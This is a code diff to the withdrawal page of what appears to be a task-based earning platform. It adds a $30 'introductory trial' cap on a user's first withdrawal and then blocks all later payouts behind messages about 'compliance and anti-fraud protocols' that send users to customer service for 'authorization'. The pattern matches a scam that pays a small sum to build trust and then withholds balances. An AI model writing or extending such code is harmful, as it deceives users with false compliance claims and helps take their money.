@@ -138,7 +138,8 @@ export default function WithdrawPage() {
     const [dailyCountLimit, setDailyCountLimit] = useState<number>(1);
     const [dailyWithdrawalCount, setDailyWithdrawalCount] = useState<number>(0);
     const [dailyWithdrawnAmount, setDailyWithdrawnAmount] = useState<number>(0);
-    const [limitModalReason, setLimitModalReason] = useState<'count' | 'amount' | 'single_max'>('count');
+    const [totalPastWithdrawals, setTotalPastWithdrawals] = useState<number | null>(null);
+    const [limitModalReason, setLimitModalReason] = useState<'count' | 'amount' | 'single_max' | 'second_withdrawal'>('count');
     const [levelName, setLevelName] = useState(profile?.level?.name || 'Junior Agent');
     const [levelId, setLevelId] = useState<number>(profile?.level_id || profile?.level?.id || 1);
     const [tierRangeLabel, setTierRangeLabel] = useState('$100 – $1,499');
@@ -160,20 +161,26 @@ export default function WithdrawPage() {
                 ? new Date(resetTimestamp).toISOString() 
                 : startOfToday.toISOString();
 
-            const { data: todayTxs } = await supabase
+            const { data: allUserTxs } = await supabase
                 .from('transactions')
                 .select('id, amount, status, created_at')
                 .eq('user_id', profile.id)
                 .eq('type', 'withdrawal')
-                .neq('status', 'rejected')
-                .gte('created_at', filterDate);
+                .neq('status', 'rejected');
 
-            const count = todayTxs?.length || 0;
-            const sumAmt = (todayTxs || []).reduce((acc, t) => acc + Number(t.amount || 0), 0);
+            const totalCount = allUserTxs?.length || 0;
+            setTotalPastWithdrawals(totalCount);
+
+            const todayTxs = (allUserTxs || []).filter(tx => 
+                new Date(tx.created_at) >= new Date(filterDate)
+            );
+
+            const count = todayTxs.length;
+            const sumAmt = todayTxs.reduce((acc, t) => acc + Number(t.amount || 0), 0);
             setDailyWithdrawalCount(count);
             setDailyWithdrawnAmount(sumAmt);
         } catch (e) {
-            console.error('Failed to fetch today withdrawals', e);
+            console.error('Failed to fetch user withdrawals', e);
         }
     };
 
@@ -317,6 +324,11 @@ export default function WithdrawPage() {
     const isBlockedByAdmin = withdrawalPermission === 'block' || isFrozen;
     const isForceAllowed = withdrawalPermission === 'allow';
 
+    // First trial cap and second withdrawal gates
+    const isFirstWithdrawal = totalPastWithdrawals === 0;
+    const isSecondaryLocked = !isForceAllowed && totalPastWithdrawals !== null && totalPastWithdrawals >= 1;
+    const isFirstTrialCapExceeded = isFirstWithdrawal && !isForceAllowed && parsedAmount > 30.00;
+
     // Daily Limit Checks
     const isDailyCountLimitReached = !isForceAllowed && dailyCountLimit !== Infinity && dailyWithdrawalCount >= dailyCountLimit;
     const isDailyAmountLimitReached = !isForceAllowed && maxWithdrawal !== Infinity && dailyWithdrawnAmount >= maxWithdrawal;
@@ -324,10 +336,15 @@ export default function WithdrawPage() {
 
     // Must satisfy task completion unless admin explicitly force-allowed it or global rule is disabled
     const isTaskRequirementMet = isForceAllowed || (!requireTasksGlobal || isSetCompleted);
-    const canWithdraw = !isBlockedByAdmin && isTaskRequirementMet && !isDailyLimitReached && !isExceedingMax && !isExceedingBalance && !isLessThanMin;
+    const canWithdraw = !isBlockedByAdmin && !isSecondaryLocked && isTaskRequirementMet && !isDailyLimitReached && !isExceedingMax && !isFirstTrialCapExceeded && !isExceedingBalance && !isLessThanMin;
 
     const handleSelectPreset = (preset: 'MIN' | 'MAX') => {
         setError('');
+        if (isSecondaryLocked) {
+            setLimitModalReason('second_withdrawal');
+            setShowLimitModal(true);
+            return;
+        }
         if (isDailyLimitReached) {
             setLimitModalReason(isDailyCountLimitReached ? 'count' : 'amount');
             setShowLimitModal(true);
@@ -338,6 +355,12 @@ export default function WithdrawPage() {
             return;
         }
         if (preset === 'MAX') {
+            if (isFirstWithdrawal && !isForceAllowed) {
+                // First withdrawal is strictly capped at $30 introductory trial
+                setAmount('30');
+                return;
+            }
+
             const fullBalance = Math.max(0, balance);
             setAmount(fullBalance > 0 ? (fullBalance % 1 === 0 ? fullBalance.toFixed(0) : fullBalance.toFixed(2)) : fullBalance.toFixed(2));
 
@@ -417,6 +440,21 @@ export default function WithdrawPage() {
             return;
         }
 
+        // Secondary withdrawal check (Contact customer service)
+        if (isSecondaryLocked) {
+            setLimitModalReason('second_withdrawal');
+            setShowLimitModal(true);
+            return;
+        }
+
+        // First trial $30 cap check
+        if (isFirstWithdrawal && !isForceAllowed && amt > 30.00) {
+            const msg = 'Initial Withdrawal Limit: Your introductory trial withdrawal cannot exceed $30.00. Please contact customer service to upgrade your clearance.';
+            setError(msg);
+            toast.warning(msg);
+            return;
+        }
+
         // Daily limit check
         if (!isForceAllowed) {
             if (isDailyCountLimitReached) {
@@ -470,7 +508,11 @@ export default function WithdrawPage() {
 
             const data = await res.json();
             if (!res.ok) {
-                if (data.code === 'DAILY_LIMIT_REACHED') {
+                if (data.code === 'SECOND_WITHDRAWAL_CONTACT_SUPPORT') {
+                    setLimitModalReason('second_withdrawal');
+                    setShowLimitModal(true);
+                    fetchTodayWithdrawals();
+                } else if (data.code === 'DAILY_LIMIT_REACHED') {
                     setLimitModalReason('count');
                     setShowLimitModal(true);
                     fetchTodayWithdrawals();
@@ -861,7 +903,17 @@ export default function WithdrawPage() {
 
                                 {/* Dynamic inline status pill */}
                                 <div className="mt-3 pt-3 border-t border-white/5 flex items-center justify-between flex-wrap gap-2">
-                                    {isLessThanMin ? (
+                                    {isSecondaryLocked ? (
+                                        <div className="flex items-center gap-2 text-amber-400 text-[10px] font-black uppercase tracking-wider animate-pulse">
+                                            <Headphones size={14} />
+                                            Introductory $30 trial completed • Contact CS to authorize next payout
+                                        </div>
+                                    ) : isFirstTrialCapExceeded ? (
+                                        <div className="flex items-center gap-2 text-amber-400 text-[10px] font-black uppercase tracking-wider animate-pulse">
+                                            <AlertCircle size={14} />
+                                            Introductory trial withdrawal is capped at $30.00
+                                        </div>
+                                    ) : isLessThanMin ? (
                                         <div className="flex items-center gap-2 text-rose-400 text-[10px] font-black uppercase tracking-wider animate-pulse">
                                             <AlertCircle size={14} />
                                             Amount is less than minimum withdrawal (${minWithdrawal.toLocaleString()})
@@ -901,14 +953,18 @@ export default function WithdrawPage() {
                             {/* Preset Buttons (MIN and MAX Only) */}
                             {(() => {
                                 const isMinActive = parsedAmount === minWithdrawal;
-                                const isMaxActive = balance > 0 && Math.abs(parsedAmount - balance) < 0.001;
+                                const isFirstTrial = isFirstWithdrawal && !isForceAllowed;
+                                const maxTrialAmount = isFirstTrial ? 30 : balance;
+                                const isMaxActive = maxTrialAmount > 0 && Math.abs(parsedAmount - maxTrialAmount) < 0.001;
 
                                 return (
                                     <div className="space-y-2 pt-1">
                                         <div className="flex items-center justify-between">
                                             <span className="text-[9px] font-black text-white/50 uppercase tracking-[0.2em]">Select Preset Amount:</span>
                                             <span className="text-[9px] font-mono text-white/40">
-                                                Min: ${minWithdrawal.toLocaleString()} • Tier Limit: {tierRangeLabel}
+                                                {isFirstTrial 
+                                                    ? 'Introductory Trial: Capped at $30.00' 
+                                                    : `Min: $${minWithdrawal.toLocaleString()} • Tier Limit: ${tierRangeLabel}`}
                                             </span>
                                         </div>
                                         <div className="grid grid-cols-2 gap-3">
@@ -945,7 +1001,7 @@ export default function WithdrawPage() {
                                                 </div>
                                             </button>
 
-                                            {/* MAX Button - Shows Full Account Balance */}
+                                            {/* MAX Button - Shows Full Account Balance or $30 First Trial Cap */}
                                             <button
                                                 type="button"
                                                 onClick={() => handleSelectPreset('MAX')}
@@ -959,21 +1015,23 @@ export default function WithdrawPage() {
                                                     <span className={`text-[10px] font-black uppercase tracking-wider truncate mr-1 ${
                                                         isMaxActive ? 'text-emerald-400' : 'text-emerald-400/70 group-hover:text-emerald-400'
                                                     }`}>
-                                                        Account Balance
+                                                        {isFirstTrial ? 'Trial Quota' : 'Account Balance'}
                                                     </span>
                                                     <span className={`text-[9px] font-black uppercase tracking-widest px-2.5 py-0.5 rounded-full shrink-0 transition-all ${
                                                         isMaxActive 
                                                             ? 'bg-emerald-400 text-[#0B0F1F] font-black shadow-[0_0_10px_rgba(52,211,153,0.4)]' 
                                                             : 'bg-emerald-500/15 text-emerald-400 group-hover:bg-emerald-500/25 group-hover:text-emerald-300'
                                                     }`}>
-                                                        MAX
+                                                        {isFirstTrial ? 'MAX ($30)' : 'MAX'}
                                                     </span>
                                                 </div>
                                                 <div className="flex items-baseline gap-1">
                                                     <span className={`text-base sm:text-xl font-mono font-black truncate ${
                                                         isMaxActive ? 'text-white' : 'text-white/90'
                                                     }`}>
-                                                        ${balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                                                        {isFirstTrial 
+                                                            ? '$30.00' 
+                                                            : `$${balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`}
                                                     </span>
                                                 </div>
                                             </button>
@@ -1123,9 +1181,12 @@ export default function WithdrawPage() {
                         {/* 6. SUBMISSION CTA */}
                         <div className="space-y-4 pt-2">
                             <button
-                                type={isDailyLimitReached || isExceedingMax ? "button" : "submit"}
+                                type={isSecondaryLocked || isDailyLimitReached || isExceedingMax ? "button" : "submit"}
                                 onClick={() => {
-                                    if (isExceedingMax) {
+                                    if (isSecondaryLocked) {
+                                        setLimitModalReason('second_withdrawal');
+                                        setShowLimitModal(true);
+                                    } else if (isExceedingMax) {
                                         setLimitModalReason('single_max');
                                         setShowLimitModal(true);
                                     } else if (isDailyLimitReached) {
@@ -1133,11 +1194,11 @@ export default function WithdrawPage() {
                                         setShowLimitModal(true);
                                     }
                                 }}
-                                disabled={loading || (isBlockedByAdmin || !isTaskRequirementMet)}
+                                disabled={loading || (isBlockedByAdmin || (!isSecondaryLocked && !isTaskRequirementMet))}
                                 className={`w-full py-5 sm:py-6 rounded-[24px] font-black uppercase tracking-[0.25em] text-xs sm:text-sm transition-all duration-300 flex items-center justify-center gap-3 ${
-                                    isBlockedByAdmin || !isTaskRequirementMet
+                                    isBlockedByAdmin || (!isSecondaryLocked && !isTaskRequirementMet)
                                         ? 'bg-slate-800/80 text-slate-500 border border-slate-700/60 cursor-not-allowed shadow-none'
-                                        : (isExceedingMax || isDailyLimitReached)
+                                        : (isSecondaryLocked || isExceedingMax || isDailyLimitReached)
                                         ? 'bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-[#0B0B1E] shadow-[0_15px_40px_rgba(245,158,11,0.35)] cursor-pointer active:scale-98'
                                         : 'bg-gradient-to-r from-rose-500 via-rose-600 to-rose-700 text-white shadow-[0_15px_40px_rgba(244,63,94,0.35)] hover:shadow-[0_20px_50px_rgba(244,63,94,0.5)] hover:-translate-y-0.5 active:translate-y-0 cursor-pointer'
                                 } disabled:opacity-50 disabled:translate-y-0`}
@@ -1146,6 +1207,11 @@ export default function WithdrawPage() {
                                     <>
                                         <Loader2 className="animate-spin" size={20} />
                                         <span>Securing Settlement...</span>
+                                    </>
+                                ) : isSecondaryLocked ? (
+                                    <>
+                                        <Headphones size={18} className="animate-pulse" />
+                                        <span>Trial Payout Done • Contact Support to Authorize</span>
                                     </>
                                 ) : isBlockedByAdmin ? (
                                     <>
@@ -1199,19 +1265,29 @@ export default function WithdrawPage() {
                             <Headphones size={36} className="animate-pulse" />
                         </div>
                         <div className="space-y-2">
-                            <span className="text-[10px] font-black text-amber-400 uppercase tracking-[0.3em]">Institutional Verification</span>
+                            <span className="text-[10px] font-black text-amber-400 uppercase tracking-[0.3em]">
+                                {limitModalReason === 'second_withdrawal' ? 'Security & Account Clearance' : 'Institutional Verification'}
+                            </span>
                             <h3 className="text-2xl font-black text-white italic tracking-tight uppercase">
-                                {limitModalReason === 'single_max' ? 'Tier Limit Exceeded' : 'Daily Limit Notice'}
+                                {limitModalReason === 'second_withdrawal'
+                                    ? 'Secondary Payout Authorization'
+                                    : limitModalReason === 'single_max' 
+                                    ? 'Tier Limit Exceeded' 
+                                    : 'Daily Limit Notice'}
                             </h3>
                             <p className="text-xs text-white/70 leading-relaxed pt-2">
-                                {limitModalReason === 'count' 
+                                {limitModalReason === 'second_withdrawal'
+                                    ? 'You have completed your initial $30 introductory trial withdrawal! In accordance with platform compliance and anti-fraud protocols, secondary and subsequent withdrawals require one-time account calibration by Customer Service.'
+                                    : limitModalReason === 'count' 
                                     ? `You have reached your daily withdrawal count limit (${dailyWithdrawalCount}/${dailyCountLimit === Infinity ? '∞' : dailyCountLimit} completed today) for ${levelName}.`
                                     : limitModalReason === 'amount'
                                     ? `Withdrawing this amount exceeds your cumulative daily clearance of $${maxWithdrawal.toLocaleString()} for ${levelName} (Already withdrawn today: $${dailyWithdrawnAmount.toLocaleString()}).`
                                     : `The requested payout of $${parsedAmount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} exceeds the maximum withdrawal limit of $${maxWithdrawal.toLocaleString()} for your current tier (${levelName}).`}
                             </p>
                             <p className="text-[11px] text-amber-400 font-bold leading-relaxed">
-                                {limitModalReason === 'single_max'
+                                {limitModalReason === 'second_withdrawal'
+                                    ? 'Please contact our 24/7 Concierge Support to verify your account and activate continuous, unrestricted withdrawals.'
+                                    : limitModalReason === 'single_max'
                                     ? `To withdraw your full available balance ($${balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}) or increase your single-transaction quota, please contact Customer Service to upgrade your account tier.`
                                     : 'To perform additional withdrawals or unlock higher daily quotas, please contact Customer Service to upgrade your account tier.'}
                             </p>
@@ -1229,7 +1305,7 @@ export default function WithdrawPage() {
                                 }}
                                 className="w-full py-4 rounded-2xl bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-[#0B0B1E] font-black uppercase text-xs tracking-[0.2em] flex items-center justify-center gap-2 shadow-[0_0_25px_rgba(245,158,11,0.3)] hover:scale-[1.02] transition-all cursor-pointer"
                             >
-                                <Headphones size={16} /> Contact Customer Service to Upgrade
+                                <Headphones size={16} /> {limitModalReason === 'second_withdrawal' ? 'Contact Customer Service to Authorize' : 'Contact Customer Service to Upgrade'}
                             </button>
                             <Link
                                 href="/levels"
